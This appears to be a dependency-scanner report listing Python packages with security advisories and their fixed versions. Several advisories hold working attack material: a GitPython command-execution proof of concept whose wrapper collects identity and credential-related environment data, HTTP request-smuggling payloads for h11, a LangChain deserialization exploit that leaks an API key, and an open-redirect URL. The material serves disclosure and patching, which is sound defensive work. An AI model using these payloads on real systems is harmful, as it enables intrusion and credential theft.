  CVE-2026-42215: ### Summary GitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.  ### Details GitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:  - `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe. - `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.  The vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:  - `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390` - `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071` - `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125` - `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`  That validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.  Later, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:  - `upload_pack=...` becomes `--upload-pack=...` - `receive_pack=...` becomes `--receive-pack=...`  Because the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.  In practice:  - `remote.fetch(**{"upload-pack": helper})` is blocked with `UnsafeOptionError` - `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution  The same bypass works for:  ```python Repo.clone_from(origin, out, upload_pack=helper) repo.remote("origin").fetch(upload_pack=helper) repo.remote("origin").pull(upload_pack=helper) repo.remote("origin").push(receive_pack=helper) ```  This does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.  Existing tests cover the hyphenated form, not the vulnerable underscore form. For example:  - `test/test_clone.py:129-136` checks `{"upload-pack": ...}` - `test/test_remote.py:830-833` checks `{"upload-pack": ...}` - `test/test_remote.py:968-975` checks `{"receive-pack": ...}`  Those tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.  ### PoC 1. Create and activate a virtual environment in the repository root:  ```bash python3 -m venv .venv-sec .venv-sec/bin/pip install setuptools gitdb source ./.venv-sec/bin/activate ```  2. make a new python file and put the following in there, then run it:  ```python import os import stat import subprocess import tempfile  from git import Repo from git.exc import UnsafeOptionError  # Setup: create isolated repositories so the PoC uses a normal fetch flow. base = tempfile.mkdtemp(prefix="gp-poc-risk-") origin = os.path.join(base, "origin.git") producer = os.path.join(base, "producer") victim = os.path.join(base, "victim") proof = os.path.join(base, "proof.txt") wrapper = os.path.join(base, "wrapper.sh")  # Setup: this wrapper is just to demo things you can do, not required for the exploit to work # you could also do something like an SSH reverse shell, really anything with open(wrapper, "w") as f:     f.write(f"""#!/bin/sh {{   echo "code_exec=1"   echo "whoami=$(id)"   echo "cwd=$(pwd)"   echo "uname=$(uname -a)"   printf 'argv='; printf '<%s>' "$@"; echo   env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=<redacted>/' || true }} > '{proof}' exec git-upload-pack "$@" """) os.chmod(wrapper, stat.S_IRWXU)  subprocess.run(["git", "init", "--bare", origin], check=True, stdout=subprocess.DEVNULL) subprocess.run(["git", "clone", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  with open(os.path.join(producer, "README"), "w") as f:     f.write("x")  subprocess.run(["git", "-C", producer, "add", "README"], check=True, stdout=subprocess.DEVNULL) subprocess.run(     ["git", "-C", producer, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-m", "init"],     check=True,     stdout=subprocess.DEVNULL, ) subprocess.run(["git", "-C", producer, "push", "origin", "HEAD"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) subprocess.run(["git", "clone", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  repo = Repo(victim) remote = repo.remote("origin")  # the literal Git option name is properly blocked. try:     remote.fetch(**{"upload-pack": wrapper})     print("control=unexpected_success") except UnsafeOptionError:     print("control=blocked")  # this is the actual vulnerability # you can also just do upload_pack="touch /tmp/proof", the wrapper is just to show greater impact # if you do the "touch /tmp/proof" the script will crash, but the file will have been created remote.fetch(upload_pack=wrapper)  # Proof: the helper ran as the GitPython host process. print("proof_exists", os.path.exists(proof), proof) print(open(proof).read()) ```  3. Expected result:  - The script prints `control=blocked` - The script prints `proof_exists True ...` - The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names  Example output:  ```bash GitPython % python3 test.py control=blocked proof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt code_exec=1 whoami=uid=501(wes) gid=20(staff) <redacted> cwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim uname=Darwin  <redacted> Darwin Kernel Version  <redacted>; root:xnu-11417. <redacted> argv=</var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git> USER=<redacted> SSH_AUTH_SOCK=<redacted> PATH=<redacted> HOME=<redacted> ```  This PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.  ### Impact Who is impacted: - Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior - Systems that accept a user-provided dict of "extra Git options" and pass it into GitPython with `**kwargs` - CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )  What the attacker needs to control:  - A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`  From a severity perspective, this could lead to - Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process - Modification of repositories, build outputs, or release artifacts - Lateral movement from CI/CD workers or automation hosts - Full compromise of the worker or service process handling repository operations  The highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.
  Fix: 3.1.47
[null] google-ai-generativelanguage 0.6.15
  null: null
  Fix: No fix available
[null] google-api-core 2.24.2
  null: null
  Fix: No fix available
[null] google-api-python-client 2.166.0
  null: null
  Fix: No fix available
[null] google-auth 2.38.0
  null: null
  Fix: No fix available
[null] google-auth-httplib2 0.2.0
  null: null
  Fix: No fix available
[null] google-auth-oauthlib 1.2.1
  null: null
  Fix: No fix available
[null] google-cloud-core 2.4.3
  null: null
  Fix: No fix available
[null] google-cloud-storage 2.19.0
  null: null
  Fix: No fix available
[null] google-crc32c 1.7.1
  null: null
  Fix: No fix available
[null] google-generativeai 0.8.4
  null: null
  Fix: No fix available
[null] google-resumable-media 2.7.2
  null: null
  Fix: No fix available
[null] googleapis-common-protos 1.63.2
  null: null
  Fix: No fix available
[null] greenlet 3.1.1
  null: null
  Fix: No fix available
[null] gremlinpython 3.8.0
  null: null
  Fix: No fix available
[null] grpcio 1.67.1
  null: null
  Fix: No fix available
[null] grpcio-status 1.67.1
  null: null
  Fix: No fix available
[null] grpcio-tools 1.67.1
  null: null
  Fix: No fix available
[null] h11 0.14.0
  PYSEC-2026-348: ### Impact  A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.   ### Details  HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of "chunks", each of which consists of:  - chunk length - `\r\n` - `length` bytes of content - `\r\n`  In versions of h11 up to 0.14.0, h11 instead parsed them as:  - chunk length - `\r\n` - `length` bytes of content - any two bytes   i.e. it did not validate that the trailing `\r\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.  By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:  - chunk length - `\r\n` - `length` bytes of content - more bytes of content, as many as it takes until you find a `\r\n`  For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic "read until end of line" helper to consumes the trailing `\r\n`.  In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\r\n`):  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked   5 AAAAAXX2 45 0  GET /two HTTP/1.1 Host: localhost Transfer-Encoding: chunked   0 ```  Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\r\n\r\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a "request smuggling" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.  Even worse, if our buggy reverse proxy receives two requests from different users:  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX999 0 ```  ``` GET /two HTTP/1.1 Host: localhost Cookie: SESSION_KEY=abcdef... ```  ...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.  ### Patches  Fixed in h11 0.15.0.   ### Workarounds  Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.  ### Credits  Reported by Jeppe Bonde Weikop on 2025-01-09.
  Fix: 0.16.0
[null] h2 4.2.0
  PYSEC-2026-1435: ### Summary  HTTP/2 request splitting vulnerability allows attackers to perform request smuggling attacks by injecting CRLF characters into headers. This occurs when servers downgrade HTTP/2 requests to HTTP/1.1 without properly validating header names/values, enabling attackers to manipulate request boundaries and bypass security controls.
  Fix: 4.3.0
[null] hmmlearn 0.3.3
  null: null
  Fix: No fix available
[null] hpack 4.1.0
  null: null
  Fix: No fix available
[null] html5lib 1.1
  null: null
  Fix: No fix available
[null] httpcore 1.0.8
  null: null
  Fix: No fix available
[null] httplib2 0.22.0
  null: null
  Fix: No fix available
[null] httptools 0.6.4
  null: null
  Fix: No fix available
[null] httpx 0.28.1
  null: null
  Fix: No fix available
[null] httpx-sse 0.4.0
  null: null
  Fix: No fix available
[null] huggingface-hub 0.30.2
  null: null
  Fix: No fix available
[null] humanfriendly 10.0
  null: null
  Fix: No fix available
[null] hyperframe 6.1.0
  null: null
  Fix: No fix available
[null] hypothesis 6.151.12
  null: null
  Fix: No fix available
[null] idna 3.10
  PYSEC-2026-215: This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. Payloads such as `"\u0660" * N` or `"\u30fb" * N + "\u6f22"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process.  ### Impact A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.  ### Patches Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support).  ### Workarounds Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.
  Fix: 3.15
[null] imageio 2.37.3
  null: null
  Fix: No fix available
[null] importlib-metadata 8.6.1
  null: null
  Fix: No fix available
[null] importlib-resources 6.5.2
  null: null
  Fix: No fix available
[null] iniconfig 2.1.0
  null: null
  Fix: No fix available
[null] ipykernel 7.2.0
  null: null
  Fix: No fix available
[null] ipython 9.1.0
  null: null
  Fix: No fix available
[null] ipython-pygments-lexers 1.1.1
  null: null
  Fix: No fix available
[null] ipywidgets 8.1.8
  null: null
  Fix: No fix available
[null] isodate 0.7.2
  null: null
  Fix: No fix available
[null] isoduration 20.11.0
  null: null
  Fix: No fix available
[null] isort 5.13.2
  null: null
  Fix: No fix available
[null] itsdangerous 2.2.0
  null: null
  Fix: No fix available
[null] jedi 0.19.2
  null: null
  Fix: No fix available
[null] jinja2 3.1.6
  null: null
  Fix: No fix available
[null] jiter 0.9.0
  null: null
  Fix: No fix available
[null] jmespath 1.0.1
  null: null
  Fix: No fix available
[null] joblib 1.4.2
  null: null
  Fix: No fix available
[null] json5 0.14.0
  null: null
  Fix: No fix available
[null] jsonpatch 1.33
  null: null
  Fix: No fix available
[null] jsonpath-python 1.0.6
  null: null
  Fix: No fix available
[null] jsonpointer 3.0.0
  null: null
  Fix: No fix available
[null] jsonschema 4.23.0
  null: null
  Fix: No fix available
[null] jsonschema-specifications 2024.10.1
  null: null
  Fix: No fix available
[null] jupyter 1.1.1
  null: null
  Fix: No fix available
[null] jupyter-client 8.8.0
  null: null
  Fix: No fix available
[null] jupyter-console 6.6.3
  null: null
  Fix: No fix available
[null] jupyter-core 5.9.1
  null: null
  Fix: No fix available
[null] jupyter-events 0.12.1
  null: null
  Fix: No fix available
[null] jupyter-lsp 2.3.1
  null: null
  Fix: No fix available
[null] jupyter-server 2.17.0
  PYSEC-2026-67: ### Summary  The `?next=...` URL query parameter has an open redirection vulnerability. In `jupyter_server<=2.17.0`, this URL query parameter allows redirection to arbitrary external domains, which can be exploited to facilitate phishing attacks on server users.  ### Details  The vulnerability is caused by insufficient validation in the `LoginFormHandler._redirect_safe()` method.  - Source code reference: https://github.com/jupyter-server/jupyter_server/blob/987ebdd5e188cdc49751b01a0d6782d686492a53/jupyter_server/auth/login.py#L33-L76  This vulnerability was originally reported by Noriaki Iwasaki. All discovery credit goes to them.  ### PoC  1. Navigate to `http://localhost:8888/login?next=///google.com` 2. Observe that the user is redirected to `google.com` despite it being an external domain.  The external domain passed in the `?next` parameter may be replaced with a malicious lookalike to facilitate phishing attacks. Jupyter Server deployments served on a public domain are especially vulnerable, as `prod.company.com` may be redirected to a look-alike URL such as `prod.company.dev`.   ### Impact  This vulnerability affects all users, especially enterprise users who work with sensitive/confidential data.  ### Patches  Jupyter Server 2.18+  ### Workaround  None.
  Fix: 2.18.0
[null] jupyter-server-terminals 0.5.4
  null: null
  Fix: No fix available
[null] jupyterlab 4.5.6
  PYSEC-2026-164: The allow-list of extensions that can be installed from PyPI Extension Manager (`allowed_extensions_uris`) is not correctly enforced by JupyterLab prior to 4.5.7. The PyPI Extension Manager was not contained to packages listed on the default PyPI index.  This has security implications for deployments that: - have allow-listed specific extensions with aim to prevent users from installing packages - have the kernel and terminals disabled or delegated to remote hosts (thus no access to install packages in the single-user server environment) - have multi-tenant deployments that is not configured for untrusted users (as per documented on JupyterHub https://jupyterhub.readthedocs.io/en/5.2.1/explanation/websecurity.html) - have the (default) PyPI Extension Manager enabled  ### Impact  An authenticated attacker - such as a student in a shared JupyterHub environment or a user in a multi-tenant JupyterLab deployment - can escalate their privileges. This might allow for data exfiltration, lateral movement within the network, and persistent compromise of the server infrastructure.  ### Patches  JupyterLab [`v4.5.7`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.7) contains the patch.  Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.  ### Workarounds  Switch to read-only extension manager by adding the following command line option:  ```bash --LabApp.extension_manager=readonly ```  or the following traitlet:  ```python c.LabApp.extension_manager = 'readonly' ```  You can confirm that the read-only manager is in use from GUI:  <img width="293" height="293" alt="image" src="https://github.com/user-attachments/assets/8016c809-633e-4ed0-a5bc-6bc4793caa0f" />  Note: configuration of a PyPI proxy with allow-listed packages is not sufficient to protect from this vulnerability.  ### References  - allow-list https://jupyterlab.readthedocs.io/en/stable/user/extensions.html#listing-configuration - https://jupyterhub.readthedocs.io/en/5.2.1/explanation/websecurity.html - https://jupyterlab.readthedocs.io/en/latest/user/extensions.html#extension-manager-implementations
  Fix: 4.5.7
[null] jupyterlab-pygments 0.3.0
  null: null
  Fix: No fix available
[null] jupyterlab-server 2.28.0
  null: null
  Fix: No fix available
[null] jupyterlab-widgets 3.0.16
  null: null
  Fix: No fix available
[null] kiwisolver 1.4.9
  null: null
  Fix: No fix available
[null] kubernetes 32.0.1
  null: null
  Fix: No fix available
[null] langchain 0.3.19
  CVE-2026-55443: ## Summary  Several LangChain components that resolve filesystem paths or expand search patterns do not consistently confine the *resolved* path to the intended root directory. Affected behaviors include: a file-search agent middleware that validates a starting directory but not the search pattern or the resolved target of matched files, so glob patterns and symlinks can reach files outside the configured root; prompt- and chain/agent-configuration loaders that accept path fields and resolve them without confining the result to a trusted base or rejecting symlink targets; and path-prefix authorization checks that compare by string prefix without a path-segment boundary, so a sibling path sharing the prefix is accepted. When these components receive path values, search patterns, or workspace contents influenced by an untrusted source — including an LLM acting on untrusted input — the result can be disclosure of files outside the intended boundary. We have no evidence of this behavior being triggered in the wild.  ## Affected users / systems  You may be affected if you expose an agent with filesystem-search middleware over a directory and accept prompts or retrieved content influenced by untrusted sources; load prompt or chain/agent configuration from untrusted or shared sources; or rely on path-prefix restrictions to confine tool file access. Callers that confine these components to fully trusted inputs and first-party configuration are not affected.  ## Impact  - Confidentiality: disclosure of file contents outside the intended root/sandbox. - Authorization: path-prefix bypass can grant access to sibling resources beyond the intended subtree.  ## Patches / mitigation  The affected components will canonicalize candidate paths (resolving symlinks) and verify the resolved real path remains within the configured root before reading or returning it; search patterns will be normalized so they cannot escape the root; configuration loaders will confine resolved path fields and reject symlink escapes unless the caller explicitly opts in to dangerous loading; and path-prefix checks will enforce a path-segment boundary. Path validation will be made operating-system-portable.  ## Compatibility  Callers that already pass only in-root paths, validated configuration, and trusted search inputs see no behavioral change. Callers that intentionally reference external paths can opt in via the existing dangerous-loading flag.  ## Operational guidance  Confine filesystem-backed agent tools to a dedicated directory and prefer running them sandboxed/containerized; validate path and identifier inputs where untrusted input enters; do not enable dangerous loading for configuration whose origin you do not control.  ## LangSmith / hosted deployments note  This issue concerns library components executed by agents.
  Fix: 1.3.9
[null] langchain-astradb 0.6.0
  null: null
  Fix: No fix available
[null] langchain-community 0.3.18
  PYSEC-2026-1515: The langchain-ai/langchain project, specifically the EverNoteLoader component, is vulnerable to XML External Entity (XXE) attacks due to insecure XML parsing. The vulnerability arises from the use of etree.iterparse() without disabling external entity references, which can lead to sensitive information disclosure. An attacker could exploit this by crafting a malicious XML payload that references local files, potentially exposing sensitive data such as /etc/passwd. This issue has been fixed in 0.3.27 of langchain-community.
  Fix: 0.3.27
[null] langchain-core 0.3.51
  PYSEC-2026-373: ## Summary  A serialization injection vulnerability exists in LangChain's `dumps()` and `dumpd()` functions. The functions do not escape dictionaries with `'lc'` keys when serializing free-form dictionaries. The `'lc'` key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data.  ### Attack surface  The core vulnerability was in `dumps()` and `dumpd()`: these functions failed to escape user-controlled dictionaries containing `'lc'` keys. When this unescaped data was later deserialized via `load()` or `loads()`, the injected structures were treated as legitimate LangChain objects rather than plain user data.  This escaping bug enabled several attack vectors:   1. **Injection via user data**: Malicious LangChain object structures could be injected through user-controlled fields like `metadata`, `additional_kwargs`, or `response_metadata` 2. **Class instantiation within trusted namespaces**: Injected manifests could instantiate any `Serializable` subclass, but only within the pre-approved trusted namespaces (`langchain_core`, `langchain`, `langchain_community`). This includes classes with side effects in `__init__` (network calls, file operations, etc.). Note that namespace validation was already enforced before this patch, so arbitrary classes outside these trusted namespaces could not be instantiated.   ### Security hardening  This patch fixes the escaping bug in `dumps()` and `dumpd()` and introduces new restrictive defaults in `load()` and `loads()`: allowlist enforcement via `allowed_objects="core"` (restricted to [serialization mappings](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py)), `secrets_from_env` changed from `True` to `False`, and default Jinja2 template blocking via `init_validator`. These are breaking changes for some use cases.  ## Who is affected?  Applications are vulnerable if they:  1. **Use `astream_events(version="v1")`** — The v1 implementation internally uses vulnerable serialization. Note: `astream_events(version="v2")` is not vulnerable. 2. **Use `Runnable.astream_log()`** — This method internally uses vulnerable serialization for streaming outputs.  3. **Call `dumps()` or `dumpd()` on untrusted data, then deserialize with `load()` or `loads()`** — Trusting your own serialization output makes you vulnerable if user-controlled data (e.g., from LLM responses, metadata fields, or user inputs) contains `'lc'` key structures. 4. **Deserialize untrusted data with `load()` or `loads()`** — Directly deserializing untrusted data that may contain injected `'lc'` structures. 5. **Use `RunnableWithMessageHistory`** — Internal serialization in message history handling. 6. **Use `InMemoryVectorStore.load()`** to deserialize untrusted documents. 7. Load untrusted generations from cache using **`langchain-community` caches**. 8. Load untrusted manifests from the LangChain Hub via **`hub.pull`**.  9. Use **`StringRunEvaluatorChain`** on untrusted runs. 10. Use **`create_lc_store`** or **`create_kv_docstore`** with untrusted documents. 11. Use **`MultiVectorRetriever`** with byte stores containing untrusted documents. 12. Use **`LangSmithRunChatLoader`** with runs containing untrusted messages.  The most common attack vector is through **LLM response fields** like `additional_kwargs` or `response_metadata`, which can be controlled via prompt injection and then serialized/deserialized in streaming operations.  ## Impact  Attackers who control serialized data can extract environment variable secrets by injecting `{"lc": 1, "type": "secret", "id": ["ENV_VAR"]}` to load environment variables during deserialization (when `secrets_from_env=True`, which was the old default). They can also instantiate classes with controlled parameters by injecting constructor structures to instantiate any class within trusted namespaces with attacker-controlled parameters, potentially triggering side effects such as network calls or file operations.  Key severity factors:  - Affects the serialization path - applications trusting their own serialization output are vulnerable - Enables secret extraction when combined with `secrets_from_env=True` (the old default)  - LLM responses in `additional_kwargs` can be controlled via prompt injection   ## Exploit example  ```python from langchain_core.load import dumps, load import os  # Attacker injects secret structure into user-controlled data attacker_dict = {     "user_data": {         "lc": 1,         "type": "secret",         "id": ["OPENAI_API_KEY"]     } }  serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key  os.environ["OPENAI_API_KEY"] = "sk-secret-key-12345" deserialized = load(serialized, secrets_from_env=True)  print(deserialized["user_data"])  # "sk-secret-key-12345" - SECRET LEAKED!  ```  ## Security hardening changes (breaking changes)  This patch introduces three breaking changes to `load()` and `loads()`:  1. **New `allowed_objects` parameter** (defaults to `'core'`): Enforces allowlist of classes that can be deserialized. The `'all'` option corresponds to the list of objects [specified in `mappings.py`](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py) while the `'core'` option limits to objects within `langchain_core`. We recommend that users explicitly specify which objects they want to allow for serialization/deserialization.  2. **`secrets_from_env` default changed from `True` to `False`**: Disables automatic secret loading from environment 3. **New `init_validator` parameter** (defaults to `default_init_validator`): Blocks Jinja2 templates by default  ## Migration guide  ### No changes needed for most users  If you're deserializing standard LangChain types (messages, documents, prompts, trusted partner integrations like `ChatOpenAI`, `ChatAnthropic`, etc.), your code will work without changes:  ```python  from langchain_core.load import load  # Uses default allowlist from serialization mappings obj = load(serialized_data)  ```  ### For custom classes  If you're deserializing custom classes not in the serialization mappings, add them to the allowlist:  ```python from langchain_core.load import load from my_package import MyCustomClass  # Specify the classes you need obj = load(serialized_data, allowed_objects=[MyCustomClass])  ```  ### For Jinja2 templates  Jinja2 templates are now blocked by default because they can execute arbitrary code. If you need Jinja2 templates, pass `init_validator=None`:   ```python from langchain_core.load import load from langchain_core.prompts import PromptTemplate  obj = load(     serialized_data,     allowed_objects=[PromptTemplate],     init_validator=None )  ```  > [!WARNING] > Only disable `init_validator` if you trust the serialized data. Jinja2 templates can execute arbitrary Python code.  ### For secrets from environment  `secrets_from_env` now defaults to `False`. If you need to load secrets from environment variables:  ```python  from langchain_core.load import load  obj = load(serialized_data, secrets_from_env=True)  ```   ## Credits  * Dumps bug was reported by @yardenporat * Changes for security hardening due to findings from @0xn3va and @VladimirEliTokarev
  Fix: 0.3.81
[null] langchain-openai 0.3.12
  PYSEC-2026-76: ## Summary  `langchain-openai`'s `_url_to_size()` helper (used by `get_num_tokens_from_messages` for image token counting) validated URLs for SSRF protection and then fetched them in a separate network operation with independent DNS resolution. This left a TOCTOU / DNS rebinding window: an attacker-controlled hostname could resolve to a public IP during validation and then to a private/localhost IP during the actual fetch.  The practical impact is limited because the fetched response body is passed directly to Pillow's `Image.open()` to extract dimensions — the response content is never returned, logged, or otherwise exposed to the caller. An attacker cannot exfiltrate data from internal services through this path. A potential risk is blind probing (inferring whether an internal host/port is open based on timing or error behavior).  ## Affected versions  - `langchain-openai` < 1.1.14  ## Patched versions  - `langchain-openai` >= 1.1.14 (requires `langchain-core` >= 1.2.31)  ## Affected code  **File:** `libs/partners/openai/langchain_openai/chat_models/base.py` — `_url_to_size()`  The vulnerable pattern was a validate-then-fetch with separate DNS resolution:  ```python validate_safe_url(image_source, allow_private=False, allow_http=True) # ... separate network operation with independent DNS resolution ... response = httpx.get(image_source, timeout=timeout) ```  ## Fix  The fix replaces the validate-then-fetch pattern with an SSRF-safe httpx transport (`SSRFSafeSyncTransport` from `langchain-core`) that:  - Resolves DNS once and validates all returned IPs against a policy (private ranges, cloud metadata, localhost, k8s internal DNS) - Pins the connection to the validated IP, eliminating the DNS rebinding window - Disables redirect following to prevent redirect-based SSRF bypasses  This fix was released in langchain-openai 1.1.14.
  Fix: 1.1.14
[null] langchain-text-splitters 0.3.8
  PYSEC-2026-77: ## Summary  `HTMLHeaderTextSplitter.split_text_from_url()` validated the initial URL using `validate_safe_url()` but then performed the fetch with `requests.get()` with redirects enabled (the default). Because redirect targets were not revalidated, a URL pointing to an attacker-controlled server could redirect to internal, localhost, or cloud metadata endpoints, bypassing SSRF protections.  The response body is parsed and returned as `Document` objects to the calling application code. Whether this constitutes a data exfiltration path depends on the application: if it exposes Document contents (or derivatives) back to the requester who supplied the URL, sensitive data from internal endpoints could be leaked. Applications that store or process Documents internally without returning raw content to the requester are not directly exposed to data exfiltration through this issue.  ## Affected versions  - `langchain-text-splitters` < 1.1.2  ## Patched versions  - `langchain-text-splitters` >= 1.1.2 (requires `langchain-core` >= 1.2.31)  ## Affected code  **File:** `libs/text-splitters/langchain_text_splitters/html.py` — `split_text_from_url()`  The vulnerable pattern validated the URL once then fetched with redirects enabled:  ```python validate_safe_url(url, allow_private=False, allow_http=True) response = requests.get(url, timeout=timeout, **kwargs) ```  ## Attack scenario  1. A developer passes external URLs to `split_text_from_url()`, relying on its    built-in `validate_safe_url()` check to block requests to internal networks. 2. An attacker supplies a URL pointing to a public host they control. The URL    passes `validate_safe_url()` (public hostname, public IP). 3. The attacker's server responds with a `302` redirect to an internal endpoint    (e.g., an unauthenticated internal admin API, or a cloud instance metadata    service that does not require request headers — such as AWS IMDSv1). 4. `requests.get()` follows the redirect automatically. The redirect target is    **not** revalidated. 5. The response body is parsed and returned as `Document` objects to the    application.  **Notes:**  - The core issue is a bypass of an explicitly provided SSRF protection.   `split_text_from_url()` included `validate_safe_url()` specifically to be   safe with untrusted URLs — the redirect loophole defeated that guarantee. - Cloud metadata endpoints that require special headers (AWS IMDSv2, GCP, Azure)   are not reachable through this bug because the attacker does not control   request headers. AWS IMDSv1, which requires no headers, is reachable. - Data exfiltration requires the application to return Document contents to the   party that supplied the URL. The SSRF itself — forcing the server to issue a   request to an internal endpoint — does not require this.  ## Fix  The fix replaces `requests.get()` with an SSRF-safe httpx transport (`SSRFSafeSyncTransport` from `langchain-core`) that validates DNS results and pins connections to validated IPs on every request, including redirect targets, eliminating redirect-based bypasses.  Additionally, `split_text_from_url()` has been deprecated. Users should fetch HTML content themselves and pass it to `split_text()` directly.
  Fix: 1.1.2
[null] langdetect 1.0.9
  null: null
  Fix: No fix available
[null] langfuse 2.44.0
  null: null
  Fix: No fix available
[null] langsmith 0.3.30
  CVE-2026-41182: ## Summary  The LangSmith SDK's output redaction controls (hideOutputs in JS, hide_outputs in Python) do not apply to streaming token events. When an LLM run produces streaming output, each chunk is recorded as a new_token event containing the raw token value. These events bypass the redaction pipeline entirely — prepareRunCreateOrUpdateInputs (JS) and _hide_run_outputs (Python) only process the inputs and outputs fields on a run, never the events array. As a result, applications relying on output redaction to prevent sensitive LLM output from being stored in LangSmith will still leak the full streamed content via run events.  ## Details  **Both JS and Python SDKs are affected.** The same pattern exists in both:  - **JS SDK**: `traceable.ts:997-1003` and `traceable.ts:1044-1050` - **Python SDK**: `run_helpers.py:1924` and `run_helpers.py:1996`  In both SDKs, `new_token` events with raw `kwargs.token` values are added during streaming, and the redaction pipeline (`hideOutputs` in JS, `hide_outputs` in Python) only processes `inputs`/`outputs` — never `events`.
  Fix: 0.7.31
[null] lark 1.1.9
  null: null
  Fix: No fix available
[null] ldap3 2.9.1
  null: null
  Fix: No fix available
[null] librt 0.9.0
  null: null
  Fix: No fix available
[null] license-expression 30.4.4
  null: null
  Fix: No fix available
[null] lightgbm 4.6.0
  null: null
  Fix: No fix available
[null] llvmlite 0.47.0
  null: null
  Fix: No fix available
[null] loguru 0.7.2
  null: null
  Fix: No fix available
[null] lxml 5.3.2
  PYSEC-2026-87: ### Impact Using either of the two parsers in the default configuration (with `resolve_entities=True`) allows untrusted XML input to read local files.  ### Patches lxml 6.1.0 changes the default to `resolve_entities='internal'`, thus disallowing local file access by default.  ### Workarounds Setting the `resolve_entities` option explicitly to `resolve_entities='internal'` or `resolve_entities=False` disables the local file access.  ### Resources Original report: https://bugs.launchpad.net/lxml/+bug/2146291  The default option was changed to `resolve_entities='internal'` for the normal XML and HTML parsers in lxml 5.0. The default was not changed for `iterparse()` and `ETCompatXMLParser()` at the time. lxml 6.1 makes the safe option the default for all parsers.
